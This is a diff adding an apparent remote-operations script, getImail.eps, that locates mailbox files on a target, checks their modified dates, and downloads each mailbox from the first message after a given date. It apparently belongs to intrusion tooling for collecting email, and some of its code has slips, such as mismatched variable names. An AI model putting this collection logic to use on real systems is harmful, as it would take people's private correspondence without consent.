@@ -1,0 +1,254 @@
+#---------------------------------------------------------------------------
+# getImail.eps v2.0 - Retrieves mailbox files after the specified date
+# usage: script getImail.eps -path <full path of file containing below information.
+#
+# Input: script takes in a file in the form
+#		directory,file,date
+#		directory,file,date
+#		directory,file,date
+#
+# 03/12/2007 - Original version 1.0 Completed.
+# 04/01/2007 - Instead of searching from 0 to N of the grep array I now search from N to 0.
+# 04/06/2007 - Found how to search by year by adding a \n to the search year. Now searches from 1 to N.
+# 02/12/2008 - Complete renovation of the algoritm to make it more efficient and much simpler.
+#
+# 
+#---------------------------------------------------------------------------
+
+@record off;
+@echo on;
+
+string $inputFile;
+string $collectString;
+string $mbxFile;
+string $mbxFileSplit;
+string $searchString;
+string $messageDate;
+
+string %month;
+
+%month{'Jan'} = "01";
+%month{'Feb'} = "02";
+%month{'Mar'} = "03";
+%month{'Apr'} = "04";
+%month{'May'} = "05";
+%month{'Jun'} = "06";
+%month{'Jul'} = "07";
+%month{'Aug'} = "08";
+%month{'Sep'} = "09";
+%month{'Oct'} = "10";
+%month{'Nov'} = "11";
+%month{'Dec'} = "12";
+
+int $location;
+int $size;
+
+echo "\n  ## File should have the following format ##";
+echo "##      directory,filename,date     ##";
+echo "##      directory,filename,date     ##";
+echo "##      directory,filename,date     ##";
+echo "## Date should be in the form of ##/##/####\n";
+$inputFile = getInput("Enter the input file (absolute path)");
+
+
+	if (ReadFile ($inputfile, $collectString))
+	{
+		foreach $mbxFile ($collectstring)
+		{
+			$location = 0;
+
+			$mbxFileSplit = split(",", $mbxFile);
+
+			if (sizeof($mbxFileSplit) < 2)
+			{
+				echo "Comment or Invalid Line\n";
+			} else
+			{
+
+				fixAfter($mbxFileSplit[2], $searchString);
+				
+				echo $searchString;
+
+				@record on;
+				bool $success=`getfileattribs -file $mbxFileSplit[0]\\$mbxFileSplit[1]`;
+				@record off;
+
+				bool $collectFile = checkMbxFile($success, $searchString);
+
+				if ($collectFile == FALSE)
+				{
+					echo "\n\nFILE EITHER NOT THERE, SIZE 0, OR NOT MODIFIED. SKIPPING!!!\n\n";
+				} else
+				{
+					$location = 0;
+					$size = GetCmdData("size");
+
+					@record on;
+					`grep -mask $mbxFileSplit[1] -path $mbxFileSplit[0] -pattern "From <"`;
+					@record off;
+
+					int $linePosition = GetCmdData("line_position");
+					string $lineData = GetCmdData("line_data");
+
+					if (findLocation($lineData, $searchString, $location, %month))
+					{
+						echo "\n\n$linePosition[$location] - $lineData[$location]\n\n";
+						collectFile($linePosition, $location, $mbxFileSplit, $size);
+					} else
+					{
+						echo "\n\nNO ENTRIES MET THE SEARCH CRITERIA!!!\n\n";
+					}
+
+				}
+			}
+		}
+	} else
+	{
+		echo "\n\nERROR: LOCAL FILE $inputFile NOT FOUND!!! EXITING!!!\n\n";
+		return false;
+	}
+
+return true;
+
+##############################
+# This sub collects the File #
+##############################
+sub collectFile (IN int $linePosition, IN int $location, IN string $mbxFileSplit, IN int $size)
+{
+
+	$size -= $linePosition[$location];
+
+	if ($size <= 2097152)
+	{
+		echo "\n\nGETTING FILE: ";
+		`get $mbxFileSplit[1] -path $mbxFileSplit[0] -range $linePosition[$location]`;
+		echo "\n\n";
+		pause;
+	} else
+	{
+		if (prompt "Size for this collect would be $size.\n\nGet the File?")
+		{
+			echo "\n\nGETTING FILE: ";
+			`get $mbxFileSplit[1] -path $mbxFileSplit[0] -range $linePosition[$location]`;
+			echo "\n\n";
+		} else
+		{
+			echo "\n\nSKIPPING FILE!!!\n\n";	
+		}
+	}
+}
+
+#########################################################
+# This sub finds the location of the message to collect #
+#########################################################
+
+sub findLocation(IN string $lineData, IN string $searchString, REF int $location, IN string %month)
+{
+
+	string $messageDate;
+	string $checkFrom;
+	string $splitGrepString;
+	string $mon;
+	int $length;
+
+	$length = sizeof($lineData);
+
+	while ($location < $length)
+	{
+
+		$lineData[$location] = "$lineData[$location] a";
+
+		$splitGrepString = split("\n", $lineData[$location]);
+
+		$lineData[$location] = "$splitGrepString[0]";
+		$splitGrepString = split(" ", $lineData[$location]);
+
+		ifnot ($splitGrepString[0] == "From")
+		{
+			$location++;
+			continue;
+		}
+
+		$splitGrepString[5] = "1$splitGrepString[5]";
+
+		
+
+		if ( (<int>$splitGrepString[5] >= 101) && (<int>$splitGrepString[5] <= 131) )
+		{
+			$mon = "%month{$splitGrepString[4]}";
+			$messageDate = "$splitGrepString[7]$mon$splitGrepString[5]";
+		} else
+		{
+			$mon = "%month{$splitGrepString[3]}";
+			$messageDate = "$splitGrepString[6]$mon$splitGrepString[4]";
+		}
+
+		if ($messageDate < $searchString)
+		{
+			$location++;
+		} else
+		{
+			
+			return TRUE;
+		}
+
+	}
+
+
+}
+
+#############################################################
+# This sub checks and correctly formats the after arguments.#
+#############################################################
+
+sub fixAfter(REF string $searchAfter, REF string $searchString)
+{
+	string $splitAfter = Split("/", $searchAfter);
+
+	$searchString = "$splitAfter[2]$splitAfter[0]$splitAfter[1]";
+
+	return true;
+
+}
+
+##########################################################################################
+# This sub checks the file for size and modified Date to check if we shoulc collect it.  #
+##########################################################################################
+sub checkMbxFile(IN bool $success, IN string $searchString)
+{
+
+	string $modifiedDateSplit;
+
+	####Checking if File Exists######
+
+	ifnot ($success)
+	{
+		return FALSE;
+	}
+
+	#######Checking Size Now#############
+	
+	int $size = GetCmdData("size");
+
+	if ($size == 0)
+	{
+		return FALSE;
+	} 
+
+	####Checking the modified Date####
+	string $modifiedDate = GetCmdData("ModifiedDate");
+
+	$modifiedDateSplit = split("/", $modifiedDate);
+
+	$modifiedDate = "$modifiedDateSplit[2]$modifiedDateSplit[0]$modifiedDateSplit[1]";
+
+
+	if ($searchString <= $modifiedDate)
+	{
+		return TRUE;
+	} else
+	{
+		return FALSE;
+	}
+
+}
